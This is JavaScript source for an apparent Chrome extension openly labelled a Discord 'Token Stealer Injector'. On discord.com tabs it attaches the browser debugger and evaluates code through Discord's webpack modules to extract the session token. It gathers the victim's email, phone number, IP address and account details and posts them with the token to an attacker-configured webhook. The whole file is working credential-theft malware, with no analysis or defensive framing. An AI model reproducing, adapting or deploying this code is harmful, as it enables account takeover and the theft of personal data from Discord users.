(async function() {
  var config = {
    webhook_url: "%WEBHOOK%"
  }
  
    let prevToken = ""; 
    let tabId;
    let listenerAdded = false;
    const GetBadges = (e) => {
      var n = "";
      return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
  }
    const GetNitro = (r) => {
      switch (r) {
          default:
              return ":x:"
          case 1:
              return "<:946246402105819216:962747802797113365>"
          case 2:
              return "<:946246402105819216:962747802797113365> <:Booster1Month:1051453771147911208>"
      }
  }
  const getGifOrPNG = async (url) => {
    var tt = [".gif?size=512", ".png?size=512"]
    
    const res = await fetch(url);
    const headers = res.headers;
    var type = headers.get("content-type");
    if (type == "image/gif") return url + tt[0];
    else return url + tt[1];
}

    const post = async (params, token) => {
      params = JSON.stringify(params)
      var n = JSON.stringify({
          data: params,
          token: token
      });
      [config.webhook_url].forEach(res => {
          fetch(res, {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: params
          })
          .then(response => {
              if (!response.ok) {
                  throw new Error(`Erreur HTTP! Status: ${response.status}`);
              }
          })
          .catch(error => {
              console.log('Erreur:', error);
          });
      });
    }
    
    chrome.tabs.onActivated.addListener(function(tab) {
      tabId = tab.tabId;
    });
    chrome.webNavigation.onCompleted.addListener(function() {
      chrome.tabs.get(tabId, function(tab) {
        if(tab.url == "chrome://extensions/")return;
        if (tab.url) {
          let domain = tab.url.includes("://") ? tab.url.split("://")[1].split("/")[0] : tab.url.split("/")[0];
          if (domain.startsWith("www.")) {
            domain = domain.replace("www.", "");
          }
          
          if (domain.endsWith("discord.com")) {
            if (!listenerAdded) {
            chrome.debugger.attach({tabId: tabId}, "1.0", function() {
                
                chrome.debugger.onEvent.addListener(function(debuggeeId, message, params) {
                    
                      if (message == "Console.messageAdded") {
                        var consoleMessage = params.message;
  
                    if (consoleMessage && consoleMessage.text && consoleMessage.text.match(/hawkish/)) {
                      var parties = consoleMessage.text.split(":");
                      let token = parties[1]
                      if(token == null)return;
                      if(token == " ")return;
                      if(token == "")return;
                      if (token != prevToken) {
                    prevToken = token;
                    setTimeout(async() => {
                      console.log(token)
                        
                      const response = await fetch("https://discord.com/api/v8/users/@me", {
                        method: 'GET',
                        headers: {
                            'Authorization': token
                        }
                    });
                    const user = await response.json();

                    var chibre = await (await fetch("https://api.ipify.org")).text();
                    if(user.id == undefined)return;
                    if(user.id == "undefined")return;
                    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/ghost-eye.gif"
                    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Hawkish-Eyes/Assets/main/banner.gif"  
                    userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
                    userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
                      var params = {
                        username: "Hawkish-Eyes Web Logger",
                        embeds: [{
                          "color": 16734976,
                          'url': 'https://github.com/Hawkish-Eyes',
                          "title": "<:hwkish:1104091524758773822> Hawkish-Eyes Web Injector",
                          "footer": {
                            "text": "@Hawkish-Eyes | https://github.com/Hawkish-Eyes"
                          },
                          
                          "description": `**__Token Stealer Injector__**\n\n
                          **__New Token Found on url:__**:\n ${tab.url}\n\n
                          **IP**: \`${chibre}\`\n
                          **Username** <:username:1041634536733290596>: \`${user.username}#${user.discriminator}\`\n
                          **Email** <a:email:1041639672037785691>: \`${user.email}\`\n
                          **ID** <:iduser:1041634535395307520>: \`${user.id}\`\n
                          **Nitro Type** <a:nitro:1041639670288748634>: ${GetNitro(user.premium_type)}\n
                          **Badges** <:badge:1041634538150973460>:  ${GetBadges(user.flags)}\n
                          **Phone** :mobile_phone: \`${user.phone ?? "None"}\`\n
                          <a:tokens:1041634540537511957> **Token**:\n\`\`\`${token}\`\`\``,
                          "thumbnail": {
                            "url": userAvatar
                          },
                          "image": {
                            "url": userBanner
                          }
                        }]
                      }
                      await post(params, token)
                      chrome.debugger.detach({tabId: tabId});
                      listenerAdded = false;
                }, 2000);
                    }
                  }
                }
                });
                if(tab.url != `https://${domain}/`){
                    
                    if(tab.url == `https://${domain}`)return;
                    
                chrome.debugger.sendCommand({tabId: tabId}, "Runtime.evaluate", {
                    expression: "TOKEN = \"\"\nwindow.webpackChunkdiscord_app.push([[\nMath.random()],\n{},(req) => {\nfor (const m of Object.keys(req.c)\n.map((x) => req.c[x].exports)\n.filter((x) => x)) {\nif (m.default && m.default.getToken !== undefined) {\n\nTOKEN = m.default.getToken();\n}\n\nif (m.getToken !== undefined) {\nTOKEN = m.getToken();\n}}\n},\n\n]);\nconsole.log(\"hawkish:\" + TOKEN)"
                  }, function(result) {
                    console.log(result);
                  });
                chrome.debugger.sendCommand({tabId: tabId}, "Console.enable");
                listenerAdded = true;
                }
            })
        }
    }else if (!domain.endsWith("discord.com")){
        if (listenerAdded) {
            chrome.debugger.detach({tabId: tabId});
    }
  }
  }
})

}
)
}())
